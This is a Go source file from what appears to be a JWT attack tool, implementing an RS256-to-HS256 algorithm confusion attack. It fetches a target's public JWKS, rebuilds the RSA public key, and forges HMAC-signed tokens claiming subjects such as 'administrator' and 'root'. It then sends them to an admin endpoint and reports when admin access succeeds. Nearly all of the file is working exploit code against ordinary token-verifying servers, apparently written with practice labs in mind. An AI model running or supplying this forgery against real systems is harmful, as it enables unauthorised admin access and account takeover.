package jwt

import (
	"crypto/hmac"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"strings"

	"jwtknife/internal/httpx"
	"jwtknife/internal/jwtknifejwt"
	"jwtknife/internal/report"
)

// AlgConfusionAttack implements RS256 -> HS256 algorithm confusion
// using the server's RSA public key as the HMAC secret.
type AlgConfusionAttack struct{}

type jwks struct {
	Keys []json.RawMessage `json:"keys"`
}

type jwkRSA struct {
	Kty string `json:"kty"`
	N   string `json:"n"`
	E   string `json:"e"`
}

type oidcConfig struct {
	JWKSURI string `json:"jwks_uri"`
}

func rsaPublicKeyFromJWKS(body []byte) ([]byte, error) {
	var set jwks
	if err := json.Unmarshal(body, &set); err != nil {
		return nil, err
	}
	if len(set.Keys) == 0 {
		return nil, errors.New("empty JWKS")
	}

	var key jwkRSA
	if err := json.Unmarshal(set.Keys[0], &key); err != nil {
		return nil, err
	}
	if key.Kty != "RSA" {
		return nil, errors.New("non-RSA key in JWKS")
	}

	nb, err := base64.RawURLEncoding.DecodeString(key.N)
	if err != nil {
		return nil, err
	}
	eb, err := base64.RawURLEncoding.DecodeString(key.E)
	if err != nil {
		return nil, err
	}

	n := new(big.Int).SetBytes(nb)
	e := new(big.Int).SetBytes(eb).Int64()
	if e == 0 {
		return nil, errors.New("invalid RSA exponent")
	}

	pub := &rsa.PublicKey{
		N: n,
		E: int(e),
	}

	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return nil, err
	}

	block := &pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: der,
	}
	return pem.EncodeToMemory(block), nil
}

func fetchURL(u string) ([]byte, int, error) {
	resp, err := http.Get(u)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return b, resp.StatusCode, nil
}

func resolveJWKSURI(baseURL string, jwksURI string) (string, error) {
	// jwks_uri is often absolute, but may be relative. Resolve against the base.
	base, err := url.Parse(strings.TrimRight(baseURL, "/") + "/")
	if err != nil {
		return "", err
	}
	u, err := url.Parse(strings.TrimSpace(jwksURI))
	if err != nil {
		return "", err
	}
	return base.ResolveReference(u).String(), nil
}

// NewAlgConfusionAttack constructs the attack.
func NewAlgConfusionAttack() Attack {
	return AlgConfusionAttack{}
}

func (AlgConfusionAttack) Name() string {
	return "alg-confusion-rs256-hs256"
}

func (AlgConfusionAttack) Run(in AttackInput) report.AttackResult {
	ar := report.NewAttackResult("alg-confusion")

	// Only makes sense if original token is asymmetric
	if !strings.HasPrefix(strings.ToUpper(in.ParsedJWT.Alg), "RS") {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "original token is not RSA-signed"
		return ar
	}

	// Try common JWKS endpoints, but only check for HTTP 200 status.
	jwksPaths := []string{
		"/jwks.json",
		"/.well-known/jwks.json",
		"/.well-known/openid-configuration",
	}

	var pubKeyPEM []byte

	algUpper := strings.ToUpper(in.ParsedJWT.Alg)

	for _, path := range jwksPaths {
		// Start from the public (no-auth) base URL the user provided.
		base := strings.TrimRight(in.Targets.PublicURL, "/")
		u := base + path

		body, status, err := fetchURL(u)
		if err != nil || status != 200 {
			continue
		}

		jwksBody := body

		// If this is OIDC discovery, follow jwks_uri to fetch the actual JWKS.
		if strings.Contains(path, "openid-configuration") {
			var cfg oidcConfig
			if err := json.Unmarshal(body, &cfg); err != nil || strings.TrimSpace(cfg.JWKSURI) == "" {
				continue
			}

			jwksURL, err := resolveJWKSURI(base, cfg.JWKSURI)
			if err != nil {
				continue
			}

			b2, status2, err := fetchURL(jwksURL)
			if err != nil || status2 != 200 {
				continue
			}
			jwksBody = b2
		}

		// This attack file currently implements RS256 -> HS256 confusion.
		if strings.HasPrefix(algUpper, "RS") {
			if k, err := rsaPublicKeyFromJWKS(jwksBody); err == nil {
				pubKeyPEM = k
				break
			}
		}
	}

	if pubKeyPEM == nil {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "unable to extract RSA public key from JWKS"
		return ar
	}

	// Modify token: alg=HS256, sub=administrator
	p, err := jwtknifejwt.Parse(in.RawJWT)
	if err != nil {
		ar.Outcome = report.OutcomeError
		ar.Errors = append(ar.Errors, err.Error())
		return ar
	}

	p.Header["alg"] = "HS256"

	subjects := []string{
		"administrator",
		"admin",
		"root",
		"superuser",
		"carlos",
	}

	for _, sub := range subjects {
		p.Payload["sub"] = sub

		rebuilt, err := jwtknifejwt.Rebuild(p)
		if err != nil {
			ar.Outcome = report.OutcomeError
			ar.Errors = append(ar.Errors, err.Error())
			return ar
		}

		// Use the *entire original RS256 public key exposure assumption* as HMAC secret.
		// This matches real-world alg confusion behavior.
		parts := strings.SplitN(rebuilt, ".", 3)
		if len(parts) < 2 {
			ar.Outcome = report.OutcomeError
			ar.Errors = append(ar.Errors, "failed to rebuild unsigned token")
			return ar
		}

		unsigned := parts[0] + "." + parts[1]

		type secretVariant struct {
			label string
			key   []byte
		}

		variants := []secretVariant{
			{
				label: "raw-pem",
				key:   pubKeyPEM,
			},
			{
				label: "base64-pem",
				key:   []byte(base64.StdEncoding.EncodeToString(pubKeyPEM)),
			},
		}

		for _, v := range variants {
			h := hmac.New(sha256.New, v.key)
			h.Write([]byte(unsigned))
			sig := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
			forged := unsigned + "." + sig

			step := report.Step{
				Label:   "alg-confusion",
				Details: "RS256 → HS256 (alg confusion) using " + v.label,
				JWT:     report.JWTInfo{Token: forged},
			}

			if in.Client != nil && in.Targets.AdminURL != "" {
				r := in.Client.Do(httpx.RequestPlan{
					Label:     "admin-alg-confusion",
					URL:       in.Targets.AdminURL,
					Method:    in.Targets.Method,
					JWT:       forged,
					Placement: in.Targets.Placement,
				})
				step.HTTP = report.FromHTTPResult(r)

				if report.IsAdminSuccess(in.Baseline, step.HTTP) {
					_ = in.Client.Do(httpx.RequestPlan{
						Label:     "admin-alg-confusion-reuse",
						URL:       in.Targets.AdminURL,
						Method:    in.Targets.Method,
						JWT:       forged,
						Placement: in.Targets.Placement,
					})

					ar.Steps = append(ar.Steps, step)
					ar.Outcome = report.OutcomeSuccess
					ar.Note = "admin access via algorithm confusion (" + v.label + "); lab-style RSA→HMAC confusion"
					return ar
				}

				if report.IsInteresting(in.Baseline, step.HTTP) {
					ar.Outcome = report.OutcomeInteresting
				}
			}

			ar.Steps = append(ar.Steps, step)
		}
	}

	if ar.Outcome == "" {
		ar.Outcome = report.OutcomeNoEffect
	}
	return ar
}
